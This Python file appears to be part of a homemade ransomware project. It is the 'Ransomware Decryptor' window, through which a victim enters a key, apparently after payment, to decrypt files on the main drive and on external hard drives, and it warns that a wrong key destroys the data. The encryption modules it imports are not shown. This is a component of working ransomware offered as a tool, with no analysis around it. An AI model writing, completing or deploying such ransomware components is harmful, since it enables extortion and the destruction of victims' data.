# Import :
from tkinter import *
from tkinter.messagebox import *
from functools import partial
import threading, Crypto_files, List_external_HDD


# Variable
main_thread = threading.currentThread()

# Decrypting function
def decrypt(key, path):
    """
    Function use to start the decrypting process
    :param key -- key to decrypt:
    :param path -- path where are the encrypted files:
    :return:
    """
    # retrieve the key
    if key.get():
        # Cast the key type to Byte
        key = bytes(key.get().encode())
        # Message to confirm before the decrypting process
        if askyesno("Decrypting process", "Are you sure, you want to do that ?"
                               "\nBefore doing this, be sure you have the right key"
                               "\nA bad key will destroy your data and everything will be lost"
                               "\nYou are now aware !"):

            # Return an encrypt list files and their path
            encrypt_files_list_C = Crypto_files.list_files(path)
            list_hdd = List_external_HDD.list_hdd_files()
            list_all_files = list_hdd + encrypt_files_list_C

            # Debugging variable (to remove later)
            j = 1
            # Loop through the files
            for encrypt_file in list_all_files:
                # Print for debugging purpose, to remove later
                print("starting thread n°:" + str(j))
                # Create a thread for each files to accelerate the decrypting process
                threading.Thread(target=Crypto_files.decryption_function, args=(key, encrypt_file)).start()
                # Print for debugging purpose, to remove later
                print(threading.enumerate())
                # Print for debugging purpose, to remove later
                print("Finishing thread n°:" + str(j))
                j += 1
            # We check if all thread are finished
            for thread in threading.enumerate():
                if thread is not main_thread:
                    thread.join()
            # Ending message
            showinfo('Last step', 'Decrypting process finished !')
        else:
            # Cancellation of the decrypting process
            showinfo('Cancellation', 'Cancellation...')
    else:
        # Error message if the key field is empty
        showinfo('Error', 'Please enter a valid key !')


def payment_function(path):
    """
    Gui letting you enter the decrypting key
    """
    # Create a new window
    main_window = Tk()
    # Add a title
    main_window.title('Ransomware Decryptor')
    # Load the icon
    main_window.iconbitmap("icon.ico")

    # Main window width and height
    l = 365
    h = 25

    # Width and height of a window
    width = main_window.winfo_screenwidth()
    height = main_window.winfo_screenheight()

    # Doing math to position the window
    x = (width / 2) - (l / 2)
    y = (height / 2) - (h / 2)

    # Window position
    main_window.geometry('%dx%d+%d+%d' % (l, h, x, y))

    # Create an object to enter the key
    key = Entry(main_window, width=50)
    # Add an object to the window
    key.grid(row=0, column=0)
    # Focus on the object
    key.focus_set()
    # Create a button
    button = Button(main_window, text="decrypt", command=partial(decrypt, key, path))
    # Adding a button to the window
    button.grid(row=0, column=1)
    # Displaying the GUI
    main_window.mainloop()